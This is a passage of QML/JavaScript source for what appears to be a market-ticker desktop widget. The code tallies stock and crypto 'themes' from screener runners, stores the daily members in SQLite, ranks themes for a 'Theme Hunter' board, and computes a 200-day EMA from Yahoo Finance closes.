        // 10:00 New York time and after: how much of its peak each runner kept.
        const at10 = phase() === "regular" && etMinutes(Date.now() / 1000) >= 600
        for (const sym of sourceSymbols("stocks")) {
            const n = info[sym] || {}
            const q = quotes[sym]
            if (!q || !isFinite(q.change)) continue
            // A move over +200% counts only once the next pass confirms it:
            // single bad quotes filed HKPD +1910%, PPCB +922%, COCH +899% and
            // CHOW +831% on 2026-10-26, all up a few percent that day.
            const was = themeSeen[sym]
            themeSeen[sym] = q.change
            if (q.change >= 200 && !(was >= q.change * 0.8)) continue
            const ths = cfg.themesOn ? themesOf(sym) : []
            const w = ths.find(x => x.via === "words")
            if (w) stuck.push([sym, w.id])
            const f = themeFacts(sym, n.newsTitle || "", "")
            // Its best on the day in any group so far: a stock that joins a
            // theme late (its news aged into "no news", or a restart added a
            // theme) brings its morning's peak and volume with it.
            let dayPeak = -Infinity, dayRvol = -1
            for (const id in themeLive) {
                const o = themeLive[id][sym]
                if (!o) continue
                if (o.peak > dayPeak) dayPeak = o.peak
                if (o.rvol > dayRvol) dayRvol = o.rvol
            }
            // A stock counts towards every theme it is on, and its sector.
            for (const t of ths.concat(cfg.sectorsOn ? [sectorOf(sym)] : [])) {
                if (!t) continue
                const risk = n.dilution && n.dilution.risk
                const prev = (themeLive[t.id] || {})[sym]
                const peak = Math.max(q.change, prev ? prev.peak : -Infinity, dayPeak)
                const shell = risk === "EXTREME" || risk === "HIGH"
                const rvol = Math.max(isFinite(q.rvol) ? q.rvol : -1, prev && isFinite(prev.rvol) ? prev.rvol : -1, dayRvol)
                if (!next[t.id]) next[t.id] = Object.assign({}, themeLive[t.id] || {})
                const m = {
                    peak: peak,
                    shell: shell,
                    fresh: prev ? prev.fresh : themeFresh(t.id, sym),
                    industry: n.industry || "",
                    headline: n.newsTitle || "",
                    // Once news is seen on the day it stays: a runner that had
                    // news at 07:00 is not "no news" because the story aged.
                    news: f.news === true || (prev && prev.news === true) ? true : f.news,
                    rvol: rvol >= 0 ? rvol : NaN,
                    cap: isFinite(q.marketCap) ? q.marketCap : (prev ? prev.cap : NaN),
                    float: isFinite(f.float) ? f.float : (prev ? prev.float : NaN),
                    country: f.country || (prev ? prev.country : ""),
                    ipoDays: isFinite(f.ipoDays) ? f.ipoDays : (prev ? prev.ipoDays : NaN),
                    last: q.change,
                    at10: prev && isFinite(prev.at10) ? prev.at10 : (at10 ? q.change : NaN)
                }
                next[t.id][sym] = m
                // Written when something that scores it changes; the latest
                // change only when it moved 2 points, to keep the writes down.
                if (!prev || prev.peak !== peak || prev.shell !== shell || prev.news !== m.news
                        || (m.rvol >= 0 && !(prev.rvol >= m.rvol - 0.5)) || (isFinite(m.at10) && !isFinite(prev.at10))
                        || !(Math.abs(m.last - prev.last) < 2) || prev.country !== m.country)
                    dirty.push([t.id, sym, n.industry || "", n.newsTitle || "", m])
                else next[t.id][sym] = Object.assign({}, m, { last: prev.last })
            }
        }
        // Themes whose members all left the board keep their tally for the day.
        for (const id in themeLive)
            if (!next[id]) next[id] = themeLive[id]
        if (dirty.length || Object.keys(next).length !== Object.keys(themeLive).length)
            themeLive = next
        if (dirty.length) storeMembers(dirty)
        noteSticky(stuck, sessionDay)
    }
    // Each symbol's change at the last tally pass, for confirming huge moves.
    // Filled in place: nothing binds to it.
    property var themeSeen: ({})
    // The session the tally is running in joins the session list, once.
    function noteSession(market, d) {
        const l = themeSessions[market] || []
        if (!d || l.indexOf(d) >= 0 || !openThemeDb()) return
        db.transaction(tx => tx.executeSql("INSERT OR REPLACE INTO themesessions VALUES (?, ?)", [d, market]))
        const s = Object.assign({}, themeSessions)
        s[market] = l.concat([d]).sort()
        themeSessions = s
    }
    // [[symbol, theme id]...] whose headline matched today: stuck to that
    // theme from today. Written only when it changes.
    function noteSticky(pairs, d) {
        const changed = pairs.filter(p => { const k = themeSticky[p[0]]; return !k || k.theme !== p[1] || k.day !== d })
        if (!changed.length || !d || !openThemeDb()) return
        const s = Object.assign({}, themeSticky)
        db.transaction(tx => {
            for (const [sym, id] of changed) {
                s[sym] = { theme: id, day: d }
                tx.executeSql("INSERT OR REPLACE INTO themesticky VALUES (?, ?, ?)", [sym, id, d])
            }
        })
        themeSticky = s
    }

    // The stocks (or pairs) the tally counts: those on the screens that feed
    // it (Settings → Screeners, "Builds themes and sectors" -- by default the
    // alert screens, not the ranked lists, whose large caps would drown a
    // small-cap story). A ranked list counts its shown rows only.
    function sourceSymbols(market) {
        const out = new Set()
        for (const sc of screens) {
            if (marketOf(sc) !== market || !Screens.feedsThemes(sc)) continue
            const list = sc.type === "ranked" || sc.type === "value"
                ? (ranked[sc.id] || []).slice(0, Screens.rankCountOf(sc)) : (feeds[sc.id] || [])
            for (const r of list) out.add(r.symbol)
        }
        return Array.from(out)
    }

    // Today's reading for one theme, or null before it has any members.
    function themeToday(id) {
        const m = themeLive[id]
        if (!m || !Object.keys(m).length) return null
        const d = Themes.readDay(m, themeTune)
        d.syms = Object.keys(m)
        d.d = liveDayOf(id)
        const mk = isCryptoGroup(id) ? "crypto" : "stocks"
        d.board = liveBoard[mk]
        d.led = !!liveLeader[mk] && d.runners.some(x => x.symbol === liveLeader[mk].symbol)
        return d
    }
    // Today's runners across the whole board, per market: every symbol in
    // the live tally (any group) at or over "ran". A group's expected
    // runners scale with this, so a rally day does not light every group.
    readonly property var liveBoard: {
        const ran = { stocks: {}, crypto: {} }
        for (const id in themeLive) {
            const mk = isCryptoGroup(id) ? "crypto" : "stocks", m = themeLive[id]
            for (const s in m) if (Themes.isRunner(m[s], themeTune)) ran[mk][s] = true
        }
        return { stocks: Object.keys(ran.stocks).length, crypto: Object.keys(ran.crypto).length }
    }
    // Today's leader per market so far: the biggest runner across every group.
    readonly property var liveLeader: {
        const out = { stocks: null, crypto: null }
        for (const id in themeLive) {
            const mk = isCryptoGroup(id) ? "crypto" : "stocks", m = themeLive[id]
            for (const s in m)
                if (Themes.isRunner(m[s], themeTune) && (!out[mk] || m[s].peak > out[mk].peak)) out[mk] = { symbol: s, peak: m[s].peak }
        }
        return out
    }
    // A group's reading, live: today's tally against its finished sessions
    // (Themes.status, opts.live). Before the day's first runner, and out of
    // hours, that is the last finished session's own reading; today can
    // raise a status but never burn one. A group with no stored rows still
    // has the session calendar behind it (all empty).
    // Worked out once per change to the tally, the history or the tuning,
    // not on every call: every row asks for every theme it is on, and the
    // record rules (2026-10-26) re-read each group's sessions, which made
    // the pop-up slow. `themeGen` is read so bindings still follow changes.
    property int themeGen: 0
    onThemeLiveChanged: themeGen++
    onThemeHistChanged: themeGen++
    onThemeEmptyChanged: themeGen++
    property var statusMemo: ({ gen: -1, m: {} })     // filled in place
    function themeStatus(id) {
        const g = themeGen
        if (statusMemo.gen !== g) { statusMemo.gen = g; statusMemo.m = {} }
        if (statusMemo.m[id]) return statusMemo.m[id]
        const hist = themeHist[id] || themeEmpty[isCryptoGroup(id) ? "crypto" : "stocks"] || []
        return (statusMemo.m[id] = Themes.status(hist, themeToday(id), themeTune, { live: true }))
    }
    // Per market: the finished sessions as empty readings, for groups with
    // no history of their own.
    property var themeEmpty: ({ stocks: [], crypto: [] })

    // ── theme history ─────────────────────────────────────────────────────
    // Kept in the alert database rather than the widget's settings: it is
    // per-session data, and the panel's shared config file is the wrong place
    // for a growing record (same reasoning as the alerts themselves).
    //
    // One row per member per day -- never a daily summary. Every reading
    // (how many ran, the median move, follow-through) is computed from these
    // rows on load, so changing `ranPct` or the heat rules re-scores the whole
    // history instead of only the days after the change. The industry and the
    // headline are kept with each row so a later mapping can re-classify it.
    function openThemeDb() {
        if (!openDb()) return false
        try {
            db.transaction(tx => {
                tx.executeSql(
                "CREATE TABLE IF NOT EXISTS thememembers (day TEXT, theme TEXT, symbol TEXT, "
                + "industry TEXT, headline TEXT, peak REAL, shell INTEGER, fresh INTEGER, "
                + "PRIMARY KEY (day, theme, symbol))")
                // What the 2026-10-26 rules score on: news in 24 hours (1/0,
                // null = not known), best RVOL, market cap, float, country,
                // days since listing, the latest change and the change at 10:00.
                const cols = tx.executeSql("PRAGMA table_info(thememembers)")
                const have = {}
                for (let i = 0; i < cols.rows.length; i++) have[cols.rows.item(i).name] = true
                for (const [c, ty] of [["news", "INTEGER"], ["rvol", "REAL"], ["cap", "REAL"], ["float", "REAL"],
                                       ["country", "TEXT"], ["ipodays", "REAL"], ["last", "REAL"], ["at10", "REAL"]])
                    if (!have[c]) tx.executeSql("ALTER TABLE thememembers ADD COLUMN " + c + " " + ty)
                // Every session the tally ran, so a session in which a group
                // had nobody still counts in its history (2026-10-24).
                tx.executeSql("CREATE TABLE IF NOT EXISTS themesessions (day TEXT, market TEXT, PRIMARY KEY (day, market))")
                // Sticky membership: the theme a symbol's headline last
                // matched, and the session it did.
                tx.executeSql("CREATE TABLE IF NOT EXISTS themesticky (symbol TEXT PRIMARY KEY, theme TEXT, day TEXT)")
                // CoinGecko's taxonomy per Coinbase symbol, kept between runs (2026-10-25).
                // The row "*" marks the last full crawl.
                tx.executeSql("CREATE TABLE IF NOT EXISTS cryptoinfo (symbol TEXT PRIMARY KEY, name TEXT, marketCap REAL, rank INTEGER, categories TEXT, at INTEGER)")
                // A coin's description from CoinGecko, for its quote card (2026-10-25).
                tx.executeSql("CREATE TABLE IF NOT EXISTS cryptoabout (symbol TEXT PRIMARY KEY, text TEXT, at INTEGER)")
            })
            return true
        } catch (e) {
            console.warn("marketticker: theme history unavailable:", e)
            return false
        }
    }
    function storeMembers(rows, forDay) {
        const d = forDay || sessionDay
        if (!d || !openThemeDb()) return
        db.transaction(tx => {
            for (const [id, sym, industry, headline, m] of rows)
                tx.executeSql(memberInsert, [d, id, sym, industry, headline].concat(memberValues(m)))
        })
    }
    readonly property string memberInsert: "INSERT OR REPLACE INTO thememembers "
        + "(day, theme, symbol, industry, headline, peak, shell, fresh, news, rvol, cap, float, country, ipodays, last, at10) "
        + "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"
    // A member's stored figures, in memberInsert's order after the headline.
    function memberValues(m) {
        const num = x => typeof x === "number" && isFinite(x) ? x : null
        return [m.peak, m.shell ? 1 : 0, m.fresh ? 1 : 0, m.news === true ? 1 : m.news === false ? 0 : null,
                num(m.rvol), num(m.cap), num(m.float), m.country || "", num(m.ipoDays), num(m.last), num(m.at10)]
    }
    // A stored row back into a member.
    function memberOf(r) {
        const num = x => x === null || x === undefined || x === "" ? NaN : Number(x)
        return { peak: Number(r.peak), shell: !!r.shell, fresh: !!r.fresh, industry: r.industry || "",
                 headline: r.headline || "", news: r.news === 1 ? true : r.news === 0 ? false : null,
                 rvol: num(r.rvol), cap: num(r.cap), float: num(r.float), country: r.country || "",
                 ipoDays: num(r.ipodays), last: num(r.last), at10: num(r.at10) }
    }
    // A crypto theme's day is the UTC date; a stock theme's the session.
    function liveDayOf(id) { return isCryptoGroup(id) ? cryptoDay : sessionDay }
    // Crypto categories, and themes you made for crypto, run on UTC days.
    function isCryptoGroup(id) {
        if (Themes.isCrypto(id)) return true
        const t = allThemes.find(x => x.id === id)
        return !!t && t.market === "crypto"
    }
    // Rebuilds the history (every finished session, scored with the current
    // tuning) and today's live tally from the member rows, and drops rows
    // past twice `keepDays`. A group's history is every session of its
    // market -- the session list, plus any day with rows from before the
    // list existed -- with an empty reading where it had nobody, so its
    // baseline, "day N" and the days since it last ran count sessions, not
    // the days it happened to appear. Each reading also carries the day's
    // runners across the whole board (`board`, for the expected count).
    function loadThemes() {
        if (!sessionDay || !openThemeDb()) return
        const t = themeTune
        const days = {}               // theme id -> {day -> {symbol: member}}
        const live = {}
        const sess = { stocks: {}, crypto: {} }
        const sticky = {}
        db.transaction(tx => {
            const cut = Qt.formatDate(new Date(Date.now() - t.keepDays * 2 * 86400000), "yyyy-MM-dd")
            tx.executeSql("DELETE FROM thememembers WHERE day < ?", [cut])
            tx.executeSql("DELETE FROM themesessions WHERE day < ?", [cut])
            tx.executeSql("DELETE FROM themesticky WHERE day < ?", [cut])
            const ss = tx.executeSql("SELECT day, market FROM themesessions")
            for (let i = 0; i < ss.rows.length; i++) {
                const r = ss.rows.item(i)
                sess[r.market === "crypto" ? "crypto" : "stocks"][r.day] = true
            }
            const st = tx.executeSql("SELECT symbol, theme, day FROM themesticky")
            for (let i = 0; i < st.rows.length; i++) {
                const r = st.rows.item(i)
                sticky[r.symbol] = { theme: r.theme, day: r.day }
            }
            const rs = tx.executeSql("SELECT * FROM thememembers")
            for (let i = 0; i < rs.rows.length; i++) {
                const r = rs.rows.item(i)
                const m = memberOf(r)
                sess[isCryptoGroup(r.theme) ? "crypto" : "stocks"][r.day] = true
                if (r.day === liveDayOf(r.theme)) {
                    (live[r.theme] = live[r.theme] || {})[r.symbol] = m
                } else {
                    const byDay = days[r.theme] = days[r.theme] || {}
                    ;(byDay[r.day] = byDay[r.day] || {})[r.symbol] = m
                }
            }
        })
        // Finished sessions per market, the board's runners on each, and
        // each one's leader: the day's biggest runner across every group.
        const lists = {}, board = { stocks: {}, crypto: {} }, leader = { stocks: {}, crypto: {} }
        const runs = {}                       // symbol -> {day: peak}, stocks
        for (const mk of ["stocks", "crypto"]) {
            const now = mk === "crypto" ? cryptoDay : sessionDay
            lists[mk] = Object.keys(sess[mk]).filter(d => d !== now).sort()
        }
        for (const id in days) {
            const mk = isCryptoGroup(id) ? "crypto" : "stocks"
            for (const d in days[id]) for (const s in days[id][d]) {
                const m = days[id][d][s]
                if (!Themes.isRunner(m, t)) continue
                ;(board[mk][d] = board[mk][d] || {})[s] = true
                const L = leader[mk][d]
                if (!L || m.peak > L.peak) leader[mk][d] = { symbol: s, peak: m.peak }
                if (mk === "stocks") (runs[s] = runs[s] || {})[d] = m.peak
            }
        }
        const reading = (mk, id, d) => {
            const m = id && days[id] ? days[id][d] : null
            const r = m ? Themes.readDay(m, t) : Themes.emptyDay(d)
            r.d = d
            r.syms = m ? Object.keys(m) : []
            r.board = board[mk][d] ? Object.keys(board[mk][d]).length : 0
            r.led = !!(m && leader[mk][d] && r.runners.some(x => x.symbol === leader[mk][d].symbol))
            return r
        }
        const out = {}, last = {}
        for (const id in days) {
            // The newest finished day's members, for the Theme Hunter while
            // the market is closed.
            const ds = Object.keys(days[id]).sort()
            if (ds.length) last[id] = { d: ds[ds.length - 1], members: days[id][ds[ds.length - 1]] }
            const mk = isCryptoGroup(id) ? "crypto" : "stocks"
            out[id] = Themes.annotate(lists[mk].slice(-t.keepDays).map(d => reading(mk, id, d)), t)
        }
        const empty = {}
        for (const mk of ["stocks", "crypto"])
            empty[mk] = Themes.annotate(lists[mk].slice(-t.keepDays).map(d => reading(mk, "", d)), t)
        const all = { stocks: lists.stocks.slice(), crypto: lists.crypto.slice() }
        for (const mk of ["stocks", "crypto"]) {
            const now = mk === "crypto" ? cryptoDay : sessionDay
            if (sess[mk][now]) all[mk].push(now)
        }
        themeSessions = all
        themeRuns = runs
        themeSticky = sticky
        themeEmpty = empty
        themeHist = out
        themeLastDay = last
        themeLive = live
    }
    // Each stock's runner days in the stored sessions: symbol -> {day: peak}.
    property var themeRuns: ({})
    // A stock that keeps running: its runner days in the last `hotWindow`
    // sessions, today included -- the repeat-runner flag (CLRO: +144% on
    // 2026-10-23, +77% on 2026-10-26). {n, days: [{d, peak}], text}.
    function repeatRuns(sym) {
        const l = (themeSessions.stocks || []).slice(-themeTune.hotWindow)
        const past = themeRuns[sym] || {}
        const out = []
        for (const d of l) {
            let peak = d === sessionDay ? NaN : past[d]
            if (d === sessionDay) for (const id in themeLive) {
                const m = themeLive[id][sym]
                if (m && Themes.isRunner(m, themeTune)) { peak = m.peak; break }
            }
            if (isFinite(peak)) out.push({ d: d, peak: peak })
        }
        return { n: out.length, days: out,
                 text: out.length ? i18np("Ran on %1 of the last %2 sessions: ", "Ran on %1 of the last %2 sessions: ", out.length, l.length)
                                    + out.slice().reverse().map(x => "+" + Math.round(x.peak) + "% " + Themes.dayName(x.d) + " " + x.d.slice(5)).join(", ")
                                  : "" }
    }
    // A threshold changed in Settings → Themes: score the history again.
    onThemeTuneChanged: { themeGen++; loadThemes() }

    // ── Theme Hunter ──────────────────────────────────────────────────────
    // Every theme and sector with a reading, ranked hottest first, and the
    // runners no theme claims -- where a new theme is found before it has a
    // name. Reads today's tally while trading; while closed, each one's
    // newest finished day, which the board labels.
    function hunterBoard(market) {
        const crypto = market === "crypto"
        const rank = { hot: 3, building: 2, burnt: 1, quiet: 0 }
        const themes = [], sectors = []
        const ids = Array.from(new Set(Object.keys(themeLive).concat(Object.keys(themeLastDay))))
        for (const id of ids) {
            const isCryptoId = Themes.isCrypto(id), isSec = Themes.isSector(id)
            if (crypto !== isCryptoGroup(id)) continue
            if (String(id).indexOf("other:") === 0) continue    // industry clusters: in their sector's breakdown
            const live = themeLive[id] && Object.keys(themeLive[id]).length ? themeLive[id] : null
            const src = live || (themeLastDay[id] || {}).members || {}
            const syms = Object.keys(src)
            if (!syms.length) continue
            const s = themeStatus(id)
            const d = Themes.readDay(src, themeTune)
            const members = syms.map(k => ({ symbol: k, peak: src[k].peak })).sort((a, b) => b.peak - a.peak)
            const hist = (themeHist[id] || []).slice(-10).map(h => h.n)
            const row = Object.assign(groupInfo(id), {
                status: s.status, rank: rank[s.status] || 0,
                n: d.n, ran: d.ran, med: d.med, top: d.top, leader: members[0] ? members[0].symbol : "",
                streak: s.streak, cooling: s.cooling || [], trend: live ? hist.concat([d.n]) : hist,
                day: live ? "" : (themeLastDay[id] || {}).d || "", members: members, heat: s,
                breakdown: isSec ? sectorBreakdownOf(src) : ""
            })
            ;(isSec || isCryptoId ? sectors : themes).push(row)
        }
        const order = (a, b) => (b.rank - a.rank) || (b.n - a.n) || (b.top - a.top)
        themes.sort(order); sectors.sort(order)
        // Runners (peak at or over "ran") that no theme claims, by sector.
        const unclaimed = []
        for (const sec of sectors) {
            const src = themeLive[sec.id] && Object.keys(themeLive[sec.id]).length ? themeLive[sec.id] : (themeLastDay[sec.id] || {}).members || {}
            const rows = Object.keys(src).filter(k => Themes.isRunner(src[k], themeTune) && !claimed(k))
                .map(k => ({ symbol: k, peak: src[k].peak, headline: src[k].headline || (info[k] || {}).newsTitle || ((newsFor(k) || {}).title || "") }))
                .sort((a, b) => b.peak - a.peak)
            if (rows.length) unclaimed.push({ id: sec.id, name: sec.name, glyph: sec.glyph, status: sec.status, rows: rows })
        }
        return { themes: themes, sectors: sectors, unclaimed: unclaimed }
    }
    function sectorBreakdownOf(members) {
        const count = {}
        for (const s in members) { const ind = members[s].industry || (info[s] || {}).industry || "?"; count[ind] = (count[ind] || 0) + 1 }
        return Object.keys(count).sort((a, b) => count[b] - count[a]).map(k => k + " " + count[k]).join(", ")
    }
    // Is this symbol on a named theme -- in today's tally, in the last
    // session's (what the archive says that day), or by its headline now?
    // Unnamed industry clusters don't count.
    function claimed(sym) {
        const named = id => !Themes.isSector(id) && !Themes.isCrypto(id) && String(id).indexOf("other:") !== 0
        for (const id in themeLive) if (named(id) && themeLive[id][sym]) return true
        for (const id in themeLastDay) if (named(id) && themeLastDay[id].members[sym]) return true
        const t = themeOf(sym)
        return !!t && !t.unnamed
    }

    // ── the 200-day EMA ───────────────────────────────────────────────────
    // A real 200-day exponential average from two years of daily closes
    // (Yahoo's quote carries only the 200-day simple one), for the symbols
    // that need it -- the tape's theme candidates and rows on screens using
    // the "above its 200-day EMA" filter. Cached 12 hours; a few requests at
    // a time. {v: the EMA, or null with under 200 sessions; at}.
    property var ema200: ({})
    // Filled in place, never reassigned: wantEma() is called from inside
    // bindings (the tape, a screen's rows), and reassigning a property they
    // read would loop them.
    property var emaQueue: []
    property bool emaBusy: false
    function wantEma(syms) {
        const now = Date.now()
        for (const s of syms)
            if ((!ema200[s] || now - ema200[s].at > 12 * 3600000) && emaQueue.indexOf(s) < 0) emaQueue.push(s)
    }
    function emaWork() {
        if (emaBusy || !emaQueue.length) return
        const batch = emaQueue.splice(0, 5)
        emaBusy = true
        let left = batch.length
        const got = {}
        for (const s of batch) {
            ticker.yget("https://query1.finance.yahoo.com/v8/finance/chart/" + encodeURIComponent(s) + "?range=2y&interval=1d", x => {
                let v = null
                try {
                    const c = JSON.parse(x.responseText).chart.result[0].indicators.quote[0].close.filter(n => typeof n === "number")
                    if (c.length >= 200) {
                        let e = c.slice(0, 200).reduce((a, b) => a + b, 0) / 200
                        const k = 2 / 201
                        for (let i = 200; i < c.length; i++) e = c[i] * k + e * (1 - k)
                        v = e
                    }
                    got[s] = { v: v, at: Date.now() }
                } catch (e) {}
                if (--left) return
                ema200 = Object.assign({}, ema200, got)
                emaBusy = false
            })
        }
    }
    Timer { interval: 1500; running: true; repeat: true; onTriggered: eng.emaWork() }
    // true above, false below, undefined not known yet. Under 200 sessions:
    // true if Settings → Tape lets short histories through, else false.
    function aboveEma200(sym, price) {
        const e = ema200[sym]
        if (!e) return undefined
        if (e.v === null) return !!cfg.ema200ShortHistory
        return price > 0 ? price > e.v : undefined
    }

    // ── themes on the tape ────────────────────────────────────────────────
    // What the tape's Themes entry shows (Matt, 2026-10-24):
    //  - during a session, the tickers of each strong theme (hot, or building
    //    too, per Settings → Tape) that are still running: one drops off
    //    once it is `tapeThemeDrop`% below its session high;
    //  - a strong theme with no running ticker holds the slot itself (its
    //    icon colour, name and state) until a ticker runs again or the theme
    //    goes quiet or burnt;
    //  - after hours and at weekends there are no running tickers, so the
    //    tape shows the themes that have been strong, from their history.
    // Named themes only -- sectors and crypto categories are not themes.
    // Items: {kind: "ticker", symbol, theme, status, price, change, peak} or
    //        {kind: "theme", theme, status, streak}.
    function tapeThemeTickers() {
        const allowed = cfg.tapeThemeStatus === "building" ? ["hot", "building"] : ["hot"]
        const rank = { hot: 2, building: 1 }
        const drop = Math.max(1, cfg.tapeThemeDrop || 20) / 100
        const ids = Array.from(new Set(Object.keys(themeLive).concat(Object.keys(themeHist))))
        const groups = []
        for (const id of ids) {
            if (Themes.isSector(id) || Themes.isCrypto(id) || String(id).indexOf("other:") === 0) continue
            const s = themeStatus(id)
            if (allowed.indexOf(s.status) < 0) continue
            const g = groupInfo(id)
            // Replay (Settings → Tape): with no session running, the last
            // session's members stand in, at their latest prices.
            const live = themeLive[id] && Object.keys(themeLive[id]).length ? themeLive[id] : null
            const m = live || (cfg.tapeThemePreview ? (themeLastDay[id] || {}).members || {} : {})
            const running = Object.keys(m).map(sym => {
                const q = quotes[sym] || cquotes[sym] || {}
                return { kind: "ticker", symbol: sym, theme: g, status: s.status, price: q.price, change: q.change, peak: m[sym].peak }
            }).filter(r => {
                // Still running: not `drop` below the session high. The high
                // is the peak change applied to the same reference price.
                if (!isFinite(r.change) || !isFinite(r.peak)) return false
                if ((1 + r.change / 100) < (1 + r.peak / 100) * (1 - drop)) return false
                // Above its 200-day EMA (Settings → Tape); not yet known: held
                // back until it is, so a ticker below never flashes up.
                if (cfg.tapeAbove200) {
                    const ok = aboveEma200(r.symbol, r.price)
                    if (ok === undefined) { wantEma([r.symbol]); return false }
                    return ok
                }
                return true
            }).sort((a, b) => b.peak - a.peak)
            groups.push({ rank: rank[s.status], n: Object.keys(m).length, streak: s.streak || 0,
                          items: running.length ? running : [{ kind: "theme", theme: g, status: s.status, streak: s.streak || 0 }] })
        }
        groups.sort((a, b) => (b.rank - a.rank) || (b.n - a.n) || (b.streak - a.streak))
        const out = [], seen = {}
        for (const g of groups) for (const r of g.items) {
            const key = r.kind === "ticker" ? r.symbol : "theme:" + r.theme.id
            if (!seen[key] && (seen[key] = true)) out.push(r)
        }
        return out.slice(0, Math.max(1, cfg.tapeThemeMax || 10))
    }

    // ── re-tagging history ────────────────────────────────────────────────
    // When the rules change -- a sector override, your sectors and themes,
    // how long a theme sticks -- every stored day is tagged
    // again from its saved headline and industry, so a rule applies to the
    // past as well as from now on. Crypto rows (CoinGecko categories) are
    // left alone. A day's sector comes from its own sector row, or failing
    // that from what Finviz says about that industry today.
    readonly property string rulesKey: JSON.stringify([cfg.customThemes || "", cfg.customSectors || "", cfg.sectorOverrides || "",
                                                       themeTune.stickySessions])
    onRulesKeyChanged: if (sessionDay) retagSoon.restart()
    Timer { id: retagSoon; interval: 2000; onTriggered: eng.retagHistory() }
    // Once per start, ten minutes in -- after the restored alerts' stocks
    // have been looked up -- so days stored before sectors existed (or before
    // an industry's sector was known) get theirs.
    Timer { interval: 10 * 60000; running: true; onTriggered: eng.retagHistory() }
    property int lastRetagRows: 0
    function retagHistory() {
        if (!sessionDay || !openThemeDb()) return
        // industry -> sector: learned from every stock Finviz has described,
        // kept in the database so it grows across restarts. Not a table
        // written by hand -- Finviz's own pairing, as seen.
        const indSector = {}
        const rows = []
        db.transaction(tx => {
            tx.executeSql("CREATE TABLE IF NOT EXISTS industrysectors (industry TEXT PRIMARY KEY, sector TEXT)")
            for (const s in info) {
                const n = info[s]
                const sec = n && n.industry && n.sector ? Themes.sectorFor(n.sector) : null
                if (sec) tx.executeSql("INSERT OR REPLACE INTO industrysectors VALUES (?, ?)", [n.industry, sec.id])
            }
            const known = tx.executeSql("SELECT industry, sector FROM industrysectors")
            for (let i = 0; i < known.rows.length; i++) indSector[known.rows.item(i).industry] = known.rows.item(i).sector
            const rs = tx.executeSql("SELECT * FROM thememembers WHERE theme NOT LIKE 'c-%' AND symbol NOT LIKE '%-USD'")
            const by = {}
            for (let i = 0; i < rs.rows.length; i++) {
                const r = rs.rows.item(i)
                const m = memberOf(r)
                const k = r.day + "|" + r.symbol
                const g = by[k] = by[k] || { day: r.day, symbol: r.symbol, industry: "", headline: "", sector: "",
                                             m: Object.assign({}, m, { peak: -Infinity, shell: false }) }
                g.industry = g.industry || r.industry || ""
                g.headline = g.headline || r.headline || ""
                // The figures are the same on each of a day's rows for a
                // stock; take whichever row has them.
                for (const f of ["rvol", "cap", "float", "ipoDays", "last", "at10"]) if (!isFinite(g.m[f]) && isFinite(m[f])) g.m[f] = m[f]
                if (g.m.news === null && m.news !== null) g.m.news = m.news
                if (!g.m.country && m.country) g.m.country = m.country
                g.m.peak = Math.max(g.m.peak, m.peak)
                g.m.shell = g.m.shell || m.shell
                if (Themes.isSector(r.theme)) g.sector = r.theme
            }
            // The stock sessions, in order: the session list plus every
            // stored day (rows from before the list existed).
            const sessSet = {}
            const ss = tx.executeSql("SELECT day FROM themesessions WHERE market = 'stocks'")
            for (let i = 0; i < ss.rows.length; i++) sessSet[ss.rows.item(i).day] = true
            for (const k in by) sessSet[by[k].day] = true
            const sessions = Object.keys(sessSet).sort()
            const sessIdx = {}
            sessions.forEach((d, i) => sessIdx[d] = i)
            // Day by day, so sticky membership carries forward the way the
            // live tally applies it: a stock whose headline matched a theme
            // stays on it for `stickySessions` sessions after.
            const order = Object.keys(by).map(k => by[k]).sort((a, b) => a.day < b.day ? -1 : a.day > b.day ? 1 : 0)
            const lastMatch = {}  // symbol -> {theme, day}
            for (const g of order) {
                // The Finviz sector the day had (not one of yours, which may
                // since have changed), then the rules as they are now --
                // a pin only from the day it was made.
                const finviz = (String(g.sector).indexOf("s-") === 0 ? g.sector : "") || indSector[g.industry] || ""
                const sec = sectorForSym(g.symbol, g.industry, finviz)
                const sector = sec ? sec.id : ""
                // The day's facts as stored; its price was not, so a theme
                // with a price range only matches from the day it was made.
                const f = { headline: g.headline, sector: sector, industry: g.industry, country: g.m.country,
                            float: g.m.float, price: NaN, cap: g.m.cap, news: g.m.news, ipoDays: g.m.ipoDays }
                const on = themesFor(g.symbol, f, "stocks", g.day)
                const ths = on.map(x => x.id)
                const w = on.find(x => x.via === "words")
                if (w) lastMatch[g.symbol] = { theme: w.id, day: g.day }
                else {
                    const k = lastMatch[g.symbol]
                    if (k && sessIdx[g.day] - sessIdx[k.day] < themeTune.stickySessions && ths.indexOf(k.theme) < 0
                          && userThemes.some(x => x.id === k.theme && (x.market || "stocks") === "stocks"))
                        ths.push(k.theme)
                }
                for (const id of ths.concat([sector])) if (id) rows.push([g.day, id, g.symbol, g.industry, g.headline, g.m])
            }
            // "fresh": not a member of the same group in its previous 5 sessions.
            const seen = {}       // id -> {day: Set(symbols)}
            const out = []
            for (const r of rows) {
                const byDay = seen[r[1]] = seen[r[1]] || {}
                const i = sessIdx[r[0]]
                let fresh = true
                for (let j = Math.max(0, i - 5); j < i && fresh; j++) if (byDay[sessions[j]] && byDay[sessions[j]].has(r[2])) fresh = false
                ;(byDay[r[0]] = byDay[r[0]] || new Set()).add(r[2])
                out.push([r[0], r[1], r[2], r[3], r[4]].concat(memberValues(Object.assign({}, r[5], { fresh: fresh }))))
            }
            tx.executeSql("DELETE FROM thememembers WHERE theme NOT LIKE 'c-%' AND symbol NOT LIKE '%-USD'")
            for (const r of out) tx.executeSql(memberInsert, r)
            // The newest match per stock, unless the live tally has a newer one.
            for (const sym in lastMatch) {
                const k = themeSticky[sym]
                if (!k || k.day <= lastMatch[sym].day)
                    tx.executeSql("INSERT OR REPLACE INTO themesticky VALUES (?, ?, ?)", [sym, lastMatch[sym].theme, lastMatch[sym].day])
            }
            lastRetagRows = out.length
        })
        loadThemes()
    }

    // ── currency ──────────────────────────────────────────────────────────
    // See CURRENCY at the top. fx: currency -> units per US dollar.
    property var fx: ({ USD: 1 })
    readonly property var fiatWanted: Array.from(new Set(screens.map(s => Screens.currencyOf(s).key))).filter(c => c !== "USD")
    // Yahoo's symbol for each: "EUR=X" is euros per dollar, "BTC-USD" dollars per bitcoin.
    function fxSymbol(k) { return Screens.currencies.find(x => x.key === k).crypto ? k + "-USD" : k + "=X" }
    function refreshFx() {
        if (!fiatWanted.length) return
        ticker.withCrumb(c => {
            ticker.yget("https://query1.finance.yahoo.com/v7/finance/quote?crumb=" + encodeURIComponent(c)
